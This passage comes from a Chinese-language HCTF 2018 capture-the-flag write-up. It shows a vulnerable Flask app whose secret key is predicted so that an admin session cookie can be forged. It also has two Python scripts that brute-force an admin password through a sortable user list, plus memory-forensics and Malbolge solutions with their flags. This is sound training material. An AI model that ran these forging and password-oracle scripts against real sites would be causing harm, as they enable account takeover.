class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from flask import Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">import random</span><br><span class="line">import flag</span><br><span class="line">from werkzeug.utils import secure_filename</span><br><span class="line">import os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[&apos;SECRET_KEY&apos;] = str(random.random()*100)</span><br><span class="line">app.config[&apos;UPLOAD_FOLDER&apos;] = &apos;./uploads&apos;</span><br><span class="line">app.config[&apos;MAX_CONTENT_LENGTH&apos;] = 100 * 1024</span><br><span class="line">ALLOWED_EXTENSIONS = set([&apos;zip&apos;])</span><br><span class="line"></span><br><span class="line">def allowed_file(filename):</span><br><span class="line">    return &apos;.&apos; in filename and \</span><br><span class="line">           filename.rsplit(&apos;.&apos;, 1)[1].lower() in ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&apos;/&apos;, methods=[&apos;GET&apos;])</span><br><span class="line">def index():</span><br><span class="line">    error = request.args.get(&apos;error&apos;, &apos;&apos;)</span><br><span class="line">    if(error == &apos;1&apos;):</span><br><span class="line">        session.pop(&apos;username&apos;, None)</span><br><span class="line">        return render_template(&apos;index.html&apos;, forbidden=1)</span><br><span class="line"></span><br><span class="line">    if &apos;username&apos; in session:</span><br><span class="line">        return render_template(&apos;index.html&apos;, user=session[&apos;username&apos;], flag=flag.flag)</span><br><span class="line">    else:</span><br><span class="line">        return render_template(&apos;index.html&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&apos;/login&apos;, methods=[&apos;POST&apos;])</span><br><span class="line">def login():</span><br><span class="line">    username=request.form[&apos;username&apos;]</span><br><span class="line">    password=request.form[&apos;password&apos;]</span><br><span class="line">    if request.method == &apos;POST&apos; and username != &apos;&apos; and password != &apos;&apos;:</span><br><span class="line">        if(username == &apos;admin&apos;):</span><br><span class="line">            return redirect(url_for(&apos;index&apos;,error=1))</span><br><span class="line">        session[&apos;username&apos;] = username</span><br><span class="line">    return redirect(url_for(&apos;index&apos;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&apos;/logout&apos;, methods=[&apos;GET&apos;])</span><br><span class="line">def logout():</span><br><span class="line">    session.pop(&apos;username&apos;, None)</span><br><span class="line">    return redirect(url_for(&apos;index&apos;))</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/upload&apos;, methods=[&apos;POST&apos;])</span><br><span class="line">def upload_file():</span><br><span class="line">    if &apos;the_file&apos; not in request.files:</span><br><span class="line">        return redirect(url_for(&apos;index&apos;))</span><br><span class="line">    file = request.files[&apos;the_file&apos;]</span><br><span class="line">    if file.filename == &apos;&apos;:</span><br><span class="line">        return redirect(url_for(&apos;index&apos;))</span><br><span class="line">    if file and allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[&apos;UPLOAD_FOLDER&apos;], filename)</span><br><span class="line">        if(os.path.exists(file_save_path)):</span><br><span class="line">            return &apos;This file already exists&apos;</span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    else:</span><br><span class="line">        return &apos;This file is not a zipfile&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        extract_path = file_save_path + &apos;_&apos;</span><br><span class="line">        os.system(&apos;unzip -n &apos; + file_save_path + &apos; -d &apos;+ extract_path)</span><br><span class="line">        read_obj = os.popen(&apos;cat &apos; + extract_path + &apos;/*&apos;)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(&apos;rm -rf &apos; + extract_path)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        file = None</span><br><span class="line"></span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    if(file != None):</span><br><span class="line">        if(file.find(base64.b64decode(&apos;aGN0Zg==&apos;).decode(&apos;utf-8&apos;)) != -1):</span><br><span class="line">            return redirect(url_for(&apos;index&apos;, error=1))</span><br><span class="line">    return Response(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    #app.run(debug=True)</span><br><span class="line">    app.run(host=&apos;127.0.0.1&apos;, debug=True, port=10008)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br><span class="line"></span><br><span class="line">app.config[&apos;SECRET_KEY&apos;] = str(random.random()*100)</span><br></pre></td></tr></table></figure>

<p>发现随机数的种子用的是mac地址，可以预测secret_key</p>
<p>读mac地址 <code>/sys/class/net/eth0/address</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12:34:3e:14:7c:62</span><br></pre></td></tr></table></figure>

<p>得到secret_key</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">In [1]: 0x12343e147c62</span><br><span class="line">Out[1]: 20015589129314</span><br><span class="line"></span><br><span class="line">In [2]: import random</span><br><span class="line"></span><br><span class="line">In [3]: random.seed(20015589129314)</span><br><span class="line">   ...: print str(random.random()*100)</span><br><span class="line">   ...:</span><br><span class="line">11.9351375669</span><br></pre></td></tr></table></figure>

<p>本地flask生成session</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#encoding: utf-8</span><br><span class="line">from flask import *</span><br><span class="line">#env = SandboxedEnvironment()</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[&apos;SECRET_KEY&apos;] = &quot;11.935137566861131&quot;</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/&quot;,methods=[&apos;GET&apos;,&apos;POST&apos;])</span><br><span class="line">def login():</span><br><span class="line">        session[&apos;username&apos;] = u&apos;admin&apos;</span><br><span class="line">        return &apos;aa&apos;</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    app.run(host=&apos;0.0.0.0&apos;, port=8000)</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6ImFkbWluIn0.DsvSKw.JApw9RQgfbmB0JSG-C2iAaNXgKA</span><br></pre></td></tr></table></figure>

<p>更改session得到flag</p>
<h3 id="game"><a href="#game" class="headerlink" title="game"></a>game</h3><p>打开有一个rank list</p>
<p>可以按password排序</p>
<p><code>http://game.2018.hctf.io/web2/user.php?order=password</code></p>
<p>注册不同密码的用户，根据注册的用户和admin的顺序先后能猜测出admin的密码</p>
<p>exp1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">import re</span><br><span class="line">def reg(username,password):</span><br><span class="line">    url = &quot;http://game.2018.hctf.io/web2/action.php?action=reg&quot;</span><br><span class="line">    data = &#123;</span><br><span class="line">        &quot;username&quot;:username,</span><br><span class="line">        &quot;password&quot;:password,</span><br><span class="line">        &quot;sex&quot;:1,</span><br><span class="line">        &quot;submit&quot;:&quot;submit&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    content = requests.post(url=url,data=data).content</span><br><span class="line">    print content</span><br><span class="line">login_url = &quot;http://game.2018.hctf.io/web2/action.php?action=login&quot;</span><br><span class="line">ss =  &quot;-/123456789&quot;+string.lowercase</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for i in range(32):</span><br><span class="line">    for j in range(33,126):</span><br><span class="line">        username = &quot;daolgts&quot;+str(i) +&quot;fdfdlxx8alsdff&quot;+str(j)</span><br><span class="line">        password = flag + chr(j)</span><br><span class="line">        print username,password</span><br><span class="line">        reg(username,password)</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;username&quot;:username,</span><br><span class="line">            &quot;password&quot;:str(password),</span><br><span class="line">            &quot;submit&quot;:&quot;submit&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        print data</span><br><span class="line">        req = requests.session()</span><br><span class="line">        content = req.post(url=login_url,data=data).content</span><br><span class="line">        #print content</span><br><span class="line">        order_url = &quot;http://game.2018.hctf.io/web2/user.php?order=password&quot;</span><br><span class="line">        content = req.get(url=order_url).content</span><br><span class="line">        #print content</span><br><span class="line">        tmp = re.findall(r&apos;%s[.\s\S]+?&lt;td&gt;\s*1\s*&lt;/td&gt;\s*&lt;td&gt;\s*admin\s*&lt;/td&gt;&apos;%username,content,re.S)</span><br><span class="line">        if tmp:</span><br><span class="line">            flag = flag + chr(j-1)</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<p>exp2</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line">def reg(username,password):</span><br><span class="line">    print(&quot;reg&quot;,username,password)</span><br><span class="line">    session = requests.Session()</span><br><span class="line"></span><br><span class="line">    paramsGet = &#123;&quot;action&quot;: &quot;reg&quot;&#125;</span><br><span class="line">    paramsPost = &#123;&quot;password&quot;: password, &quot;submit&quot;: &quot;submit&quot;, &quot;sex&quot;: &quot;1&quot;, &quot;username&quot;: username&#125;</span><br><span class="line">    headers = &#123;&quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,</span><br><span class="line">               &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,</span><br><span class="line">               &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:62.0) Gecko/20100101 Firefox/62.0&quot;,</span><br><span class="line">               &quot;Referer&quot;: &quot;http://game.2018.hctf.io/web2/reg.html&quot;, &quot;Connection&quot;: &quot;close&quot;,</span><br><span class="line">               &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;,</span><br><span class="line">               &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;&#125;</span><br><span class="line">    response = session.post(&quot;http://game.2018.hctf.io/web2/action.php&quot;, data=paramsPost, params=paramsGet,</span><br><span class="line">                            headers=headers)</span><br><span class="line"></span><br><span class="line">    print(&quot;Status code:   %i&quot; % response.status_code)</span><br><span class="line">    print(&quot;Response body: %s&quot; % response.content)</span><br><span class="line">def login(session,username,password):</span><br><span class="line">    paramsGet = &#123;&quot;action&quot;: &quot;login&quot;&#125;</span><br><span class="line">    paramsPost = &#123;&quot;password&quot;: password, &quot;submit&quot;: &quot;submit&quot;, &quot;username&quot;: username&#125;</span><br><span class="line">    headers = &#123;&quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,</span><br><span class="line">               &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,</span><br><span class="line">               &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:62.0) Gecko/20100101 Firefox/62.0&quot;,</span><br><span class="line">               &quot;Referer&quot;: &quot;http://game.2018.hctf.io/web2/index.html&quot;, &quot;Connection&quot;: &quot;close&quot;,</span><br><span class="line">               &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;,</span><br><span class="line">               &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;&#125;</span><br><span class="line">    response = session.post(&quot;http://game.2018.hctf.io/web2/action.php&quot;, data=paramsPost, params=paramsGet,</span><br><span class="line">                            headers=headers)</span><br><span class="line"></span><br><span class="line">    print(&quot;Status code:   %i&quot; % response.status_code)</span><br><span class="line">    print(&quot;Response body: %s&quot; % response.content)</span><br><span class="line"></span><br><span class="line">def getUserList(session):</span><br><span class="line">    headers = &#123;&quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;,</span><br><span class="line">               &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:62.0) Gecko/20100101 Firefox/62.0&quot;,</span><br><span class="line">               &quot;Referer&quot;: &quot;http://game.2018.hctf.io/web2/game/index.html&quot;, &quot;Connection&quot;: &quot;close&quot;,</span><br><span class="line">               &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;&#125;</span><br><span class="line"></span><br><span class="line">    response = session.get(&quot;http://game.2018.hctf.io/web2/user.php?order=password&quot;, headers=headers)</span><br><span class="line"></span><br><span class="line">    print(&quot;Status code:   %i&quot; % response.status_code)</span><br><span class="line">    # print(&quot;Response body: %s&quot; % response.content)</span><br><span class="line">    tlist = response.text.split(&apos;&lt;tr&gt;&apos;)</span><br><span class="line">    nList = tlist[2:]</span><br><span class="line">    idList = []</span><br><span class="line">    nameList=[]</span><br><span class="line">    for _ in nList:</span><br><span class="line">        info=[]</span><br><span class="line">        ems = _.split(&apos;&lt;td&gt;&apos;)</span><br><span class="line">        c=0</span><br><span class="line">        for __ in ems:</span><br><span class="line">            x = __.split(&apos;&lt;/td&gt;&apos;)[0].strip()</span><br><span class="line">            if len(x)&gt;0:</span><br><span class="line">                info.append(x)</span><br><span class="line">                if c==0:</span><br><span class="line">                    idList.append(x)</span><br><span class="line">                if c==1:</span><br><span class="line">                    nameList.append(x)</span><br><span class="line">                c = c + 1</span><br><span class="line">    return idList,nameList</span><br><span class="line">def getIndexByName(nameList,x):</span><br><span class="line">    return nameList.index(x)</span><br><span class="line">def getIndexById(idList,x):</span><br><span class="line">    return idList.index(x)</span><br><span class="line">def genRandomString(slen=10):</span><br><span class="line">    return &apos;&apos;.join(random.sample(string.ascii_letters + string.digits, slen))</span><br><span class="line">def main():</span><br><span class="line">    myUsername= &apos;test@zhua.zhua&apos;</span><br><span class="line">    myPassword=&apos;test@test&apos;</span><br><span class="line">    mySession = requests.Session()</span><br><span class="line">    username=&quot;93aa243d3ef17&quot;</span><br><span class="line">    password=&quot;DSA8&amp;&amp;!@#$%^&amp;D1NGY1A&quot;</span><br><span class="line">    login(mySession,myUsername,myPassword)</span><br><span class="line">    idList,nameList = getUserList(mySession)</span><br><span class="line">    print(idList)</span><br><span class="line">    print(nameList)</span><br><span class="line">    print(nameList[getIndexById(idList,&apos;1&apos;)])</span><br><span class="line">    for _ in range(1,100):</span><br><span class="line">        l=0</span><br><span class="line">        r=128</span><br><span class="line">        while l&lt;r:</span><br><span class="line">            mid=(l+r+1)//2</span><br><span class="line">            temp = chr(mid)</span><br><span class="line">            testPass = password+temp</span><br><span class="line">            testUser = username+genRandomString(10)</span><br><span class="line">            reg(testUser,testPass)</span><br><span class="line">            idList, nameList = getUserList(mySession)</span><br><span class="line">            adminC = getIndexById(idList, &apos;1&apos;)</span><br><span class="line">            testC = getIndexByName(nameList, testUser)</span><br><span class="line">            print(&apos;compare&apos;,adminC,testC,&apos;mid=&apos;,mid,&apos;l,r&apos;,l,r)</span><br><span class="line">            if adminC&lt;testC:</span><br><span class="line">                l=mid</span><br><span class="line">            else:</span><br><span class="line">                r=mid-1</span><br><span class="line">        print(l,r)</span><br><span class="line">        password = password+chr(l)</span><br><span class="line">        print(&apos;password&apos;,password)</span><br><span class="line"></span><br><span class="line">if __name__ ==&quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h2 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc"></a>Misc</h2><h3 id="easy-dump"><a href="#easy-dump" class="headerlink" title="easy_dump"></a>easy_dump</h3><p>用gimp来将内存视为raw图片来看内存中的贴图</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">查看信息</span><br><span class="line">&#123;lamb&#125; volatility -f mem.data imageinfo</span><br><span class="line">Volatility Foundation Volatility Framework 2.5</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : Win7SP0x64, Win7SP1x64, Win2008R2SP0x64, Win2008R2SP1x64</span><br><span class="line">                     AS Layer1 : AMD64PagedMemory (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (C:\Users\hasee\Desktop\HCTF\MIsc\easy_dump\mem\mem.data)</span><br><span class="line">                      PAE type : No PAE</span><br><span class="line">                           DTB : 0x187000L</span><br><span class="line">                          KDBG : 0xf80004035070L</span><br><span class="line">          Number of Processors : 4</span><br><span class="line">     Image Type (Service Pack) : 0</span><br><span class="line">                KPCR for CPU 0 : 0xfffff80004036d00L</span><br><span class="line">                KPCR for CPU 1 : 0xfffff880009ee000L</span><br><span class="line">                KPCR for CPU 2 : 0xfffff88004568000L</span><br><span class="line">                KPCR for CPU 3 : 0xfffff880045dd000L</span><br><span class="line">             KUSER_SHARED_DATA : 0xfffff78000000000L</span><br><span class="line">           Image date and time : 2018-11-07 08:26:52 UTC+0000</span><br><span class="line">     Image local date and time : 2018-11-07 16:26:52 +0800</span><br><span class="line"></span><br><span class="line">看进程</span><br><span class="line">&#123;lamb&#125; volatility -f mem.data --profile=Win7SP0x64 pslist</span><br><span class="line">Volatility Foundation Volatility Framework 2.5</span><br><span class="line">Offset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit</span><br><span class="line">------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------</span><br><span class="line">0xfffffa80003a5040 System                    4      0    108      373 ------      0 2018-11-07 08:12:31 UTC+0000</span><br><span class="line">0xfffffa80010729d0 smss.exe                276      4      2       32 ------      0 2018-11-07 08:12:31 UTC+0000</span><br><span class="line">0xfffffa8001ee7060 csrss.exe               364    344      9      462      0      0 2018-11-07 08:12:33 UTC+0000</span><br><span class="line">0xfffffa8001fe2060 wininit.exe             416    344      3       81      0      0 2018-11-07 08:12:33 UTC+0000</span><br><span class="line">0xfffffa8001fe1060 csrss.exe               424    408     11      197      1      0 2018-11-07 08:12:33 UTC+0000</span><br><span class="line">0xfffffa800261eb30 services.exe            472    416      9      230      0      0 2018-11-07 08:12:33 UTC+0000</span><br><span class="line">0xfffffa8002638670 winlogon.exe            504    408      3      114      1      0 2018-11-07 08:12:33 UTC+0000</span><br><span class="line">0xfffffa800263cb30 lsass.exe               516    416      8      560      0      0 2018-11-07 08:12:33 UTC+0000</span><br><span class="line">0xfffffa8002640880 lsm.exe                 524    416      9      145      0      0 2018-11-07 08:12:33 UTC+0000</span><br><span class="line">0xfffffa80026fdb30 svchost.exe             648    472     11      366      0      0 2018-11-07 08:12:35 UTC+0000</span><br><span class="line">0xfffffa800272ab30 vmacthlp.exe            704    472      3       60      0      0 2018-11-07 08:12:35 UTC+0000</span><br><span class="line">0xfffffa8002725b30 svchost.exe             748    472      7      279      0      0 2018-11-07 08:12:35 UTC+0000</span><br><span class="line">0xfffffa8002780b30 svchost.exe             844    472     22      505      0      0 2018-11-07 08:12:35 UTC+0000</span><br><span class="line">0xfffffa80026deb30 svchost.exe             884    472     11      298      0      0 2018-11-07 08:12:36 UTC+0000</span><br><span class="line">0xfffffa80027cab30 svchost.exe             912    472     33      909      0      0 2018-11-07 08:12:36 UTC+0000</span><br><span class="line">0xfffffa8002c02b30 audiodg.exe            1000    844      8      143      0      0 2018-11-07 08:12:36 UTC+0000</span><br><span class="line">0xfffffa8002c169e0 svchost.exe             288    472     20      776      0      0 2018-11-07 08:12:36 UTC+0000</span><br><span class="line">0xfffffa8002c3eb30 svchost.exe             520    472     17      374      0      0 2018-11-07 08:12:37 UTC+0000</span><br><span class="line">0xfffffa80026f8340 spoolsv.exe            1096    472     13      320      0      0 2018-11-07 08:12:37 UTC+0000</span><br><span class="line">0xfffffa8002760060 svchost.exe            1124    472     18      306      0      0 2018-11-07 08:12:37 UTC+0000</span><br><span class="line">0xfffffa800271e060 VGAuthService.         1300    472      3       91      0      0 2018-11-07 08:12:37 UTC+0000</span><br><span class="line">0xfffffa8002c62060 vmtoolsd.exe           1356    472      9      225      0      0 2018-11-07 08:12:37 UTC+0000</span><br><span class="line">0xfffffa8001cabb30 taskhost.exe           1452    472     10      208      1      0 2018-11-07 08:12:37 UTC+0000</span><br><span class="line">0xfffffa8001d21b30 dwm.exe                1628    884      3       84      1      0 2018-11-07 08:12:38 UTC+0000</span><br><span class="line">0xfffffa8001d64b30 explorer.exe           1696   1548     20      661      1      0 2018-11-07 08:12:38 UTC+0000</span><br><span class="line">0xfffffa8002d0cb30 vmtoolsd.exe           2028   1696      9      199      1      0 2018-11-07 08:12:39 UTC+0000</span><br><span class="line">0xfffffa8002d42570 WmiPrvSE.exe           1392    648     10      218      0      0 2018-11-07 08:12:40 UTC+0000</span><br><span class="line">0xfffffa8002d53630 dllhost.exe            1716    472     13      204      0      0 2018-11-07 08:12:40 UTC+0000</span><br><span class="line">0xfffffa8002775b30 msdtc.exe              2236    472     12      150      0      0 2018-11-07 08:12:42 UTC+0000</span><br><span class="line">0xfffffa8002de3b30 SearchIndexer.         2476    472     13      538      0      0 2018-11-07 08:12:46 UTC+0000</span><br><span class="line">0xfffffa8003297b30 svchost.exe            2568    472     15      260      0      0 2018-11-07 08:12:46 UTC+0000</span><br><span class="line">0xfffffa8003303630 wmpnetwk.exe           2724    472     10      212      0      0 2018-11-07 08:12:47 UTC+0000</span><br><span class="line">0xfffffa8002cab800 WmiPrvSE.exe           3052    648      8      281      0      0 2018-11-07 08:12:59 UTC+0000</span><br><span class="line">0xfffffa8001cfab30 WmiApSrv.exe           1228    472      4      115      0      0 2018-11-07 08:13:05 UTC+0000</span><br><span class="line">0xfffffa8003303060 sppsvc.exe             1040    472      4      150      0      0 2018-11-07 08:14:39 UTC+0000</span><br><span class="line">0xfffffa8003323060 svchost.exe            1376    472     13      365      0      0 2018-11-07 08:14:39 UTC+0000</span><br><span class="line">0xfffffa8003344390 wordpad.exe            1804   1696      3      120      1      0 2018-11-07 08:15:35 UTC+0000</span><br><span class="line">0xfffffa8000d9ab30 MineSweeper.ex          312   1696      9      208      1      0 2018-11-07 08:15:39 UTC+0000</span><br><span class="line">0xfffffa8002de1560 mspaint.exe            2768   1696      6      122      1      0 2018-11-07 08:16:05 UTC+0000</span><br><span class="line">0xfffffa8000e07470 svchost.exe            2472    472      6      104      0      0 2018-11-07 08:16:06 UTC+0000</span><br><span class="line">0xfffffa8000cfeb30 cmd.exe                2824   1356      0 --------      0      0 2018-11-07 08:26:51 UTC+0000   2018-11-07 08:26:52 UTC+0000</span><br><span class="line">0xfffffa8002d68060 conhost.exe            2932    364      0       28      0      0 2018-11-07 08:26:51 UTC+0000   2018-11-07 08:26:52 UTC+0000</span><br><span class="line"></span><br><span class="line">导出mspaint</span><br><span class="line">volatility -f mem.data --profile=Win7SP1x64 memdump -p 2768 -D mem</span><br></pre></td></tr></table></figure>

<p>后缀名改为data，gimp2打开</p>
<p><img src="https://s1.ax1x.com/2018/11/13/iXQCHU.png" alt="iXQCHU.png"></p>
<p>处理一下</p>
<p><img src="https://s1.ax1x.com/2018/11/13/iXQiEF.png" alt="iXQiEF.png"></p>
<h3 id="difficult-programming-language"><a href="#difficult-programming-language" class="headerlink" title="difficult_programming_language"></a>difficult_programming_language</h3><p>解usb数据包得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D&apos;`;M?!\mZ4j8hgSvt2bN);^]+7jiE3Ve0A@Q=|;)sxwYXtsl2pongOe+LKa&apos;e^]\a`_X|V[Tx;:VONSRQJn1MFKJCBfFE&gt;&amp;&lt;`@9!=&lt;5Y9y7654-,P0/o-,%I)ih&amp;%$#z@xw|&#123;ts9wvXWm3~</span><br></pre></td></tr></table></figure>

<p>Malbolge语言在线运行</p>
<p>hctf{m4lb0lGe}</p>
